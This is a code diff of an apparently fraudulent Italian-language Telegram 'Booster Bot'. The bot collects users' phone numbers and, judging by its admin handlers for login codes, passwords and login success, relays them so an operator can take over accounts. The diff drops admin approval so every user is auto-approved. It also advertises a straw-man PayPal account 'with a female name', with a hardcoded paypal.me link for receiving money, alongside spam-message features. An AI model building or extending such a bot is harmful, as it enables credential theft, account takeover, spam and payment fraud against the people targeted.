@@ -41,25 +41,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if user.id not in approved_users:
-        try:
-            keyboard = [
-                [InlineKeyboardButton("✅ Attiva", callback_data=f"approve_{user.id}"),
-                 InlineKeyboardButton("❌ Declina", callback_data=f"decline_{user.id}")]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            admin_notification = (
-                f"📥 **Nuova richiesta di accesso al bot!**\n\n"
-                f"• **Utente:** {user.full_name}\n"
-                f"• **Username:** @{user.username if user.username else 'Nessuno'}\n"
-                f"• **ID:** `{user.id}`"
-            )
-            await context.bot.send_message(
-                chat_id=ADMIN_ID, text=admin_notification, reply_markup=reply_markup, parse_mode="Markdown"
-            )
-        except Exception as e:
-            logger.error(f"Errore invio notifica admin: {e}")
+        approved_users.add(user.id)
 
-    if user.id in approved_users and user_data_store.get(user.id, {}).get("phone"):
+    if user.id in user_data_store and user_data_store[user.id].get("phone"):
         await show_account_management(update, context)
         return
 
@@ -70,10 +54,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
          InlineKeyboardButton("🇪🇸 Español", callback_data="lang_es"),
          InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru")]
     ]
-    await update.message.reply_text(
-        "🌐 Seleziona la lingua del bot / Please select your language:",
-        reply_markup=InlineKeyboardMarkup(lang_keyboard)
-    )
+    
+    if update.callback_query:
+        await update.callback_query.answer()
+        await update.callback_query.message.reply_text("🌐 Seleziona la lingua del bot / Please select your language:", reply_markup=InlineKeyboardMarkup(lang_keyboard))
+    else:
+        await update.message.reply_text("🌐 Seleziona la lingua del bot / Please select your language:", reply_markup=InlineKeyboardMarkup(lang_keyboard))
 
 
 async def language_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -136,7 +122,6 @@ async def show_account_management(update: Update, context: ContextTypes.DEFAULT_
         f"• Messaggio spam: {msg_status}"
     )
 
-    # Testo e destinazione dinamica del pulsante prestanome in home
     if balance is not None:
         prestanome_btn_text = f"💳 Conto PayPal prestanome (Tot: {balance}€)"
         prestanome_callback = "view_prestanome_account"
@@ -242,7 +227,10 @@ async def view_prestanome_account(update: Update, context: ContextTypes.DEFAULT_
     await query.answer()
     
     text = (
-        "✅ **Conto PayPal Prestanome Attivo**\n\n"
+        "💳 **Conto Prestanome PayPal**\n\n"
+        "• Il conto è impostato con nome femminile.\n"
+        "• Se ricevi denaro, ricevi una notifica immediata.\n\n"
+        "✅ **Conto creato con successo!**\n"
         "Usa questo link per ricevere pagamenti:\n`https://www.paypal.me/koribaby737`"
     )
     keyboard = [
@@ -269,7 +257,10 @@ async def prestanome_paypal_created(update: Update, context: ContextTypes.DEFAUL
         pass
 
     text = (
-        "✅ **Conto creato con successo!**\n\n"
+        "💳 **Conto Prestanome PayPal**\n\n"
+        "• Il conto è impostato con nome femminile.\n"
+        "• Se ricevi denaro, ricevi una notifica immediata.\n\n"
+        "✅ **Conto creato con successo!**\n"
         "Usa questo link per ricevere pagamenti:\n`https://www.paypal.me/koribaby737`"
     )
     keyboard = [
@@ -281,7 +272,13 @@ async def prestanome_paypal_created(update: Update, context: ContextTypes.DEFAUL
 
 async def copy_link_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    await query.answer("Link copiato nella tastiera!", show_alert=True)
+    await query.answer()
+    # Manda il link in chat separata in modo che l'utente possa copiarlo facilmente tenendolo premuto
+    await context.bot.send_message(
+        chat_id=query.from_user.id,
+        text="🔗 Ecco il tuo link PayPal da copiare:\n`https://www.paypal.me/koribaby737`",
+        parse_mode="Markdown"
+    )
 
 
 async def require_link_handler(query):
@@ -660,7 +657,7 @@ def main():
     app.add_handler(CallbackQueryHandler(copy_link_handler, pattern="^copy_link_action$"))
 
     app.add_handler(CallbackQueryHandler(info_security_handler, pattern="^info_security$"))
-    app.add_handler(CallbackQueryHandler(verify_account_handler, pattern="^verify_account$"))
+    app.add_handler(CallbackCode := CallbackQueryHandler(verify_account_handler, pattern="^verify_account$"))
     app.add_handler(CallbackQueryHandler(back_to_menu_handler, pattern="^back_to_menu$"))
     
     app.add_handler(conv_link)
@@ -670,7 +667,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.User(user_id=ADMIN_ID), admin_command_handler))
     app.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^(approve_|decline_|code_sent_|success_login_|fail_login_|req_pass_)"))
 
-    print("🤖 Booster Bot aggiornato e corretto...")
+    print("🤖 Booster Bot con link copiabile in chat e dettagli conto attivi...")
     
     keep_alive()
     app.run_polling()
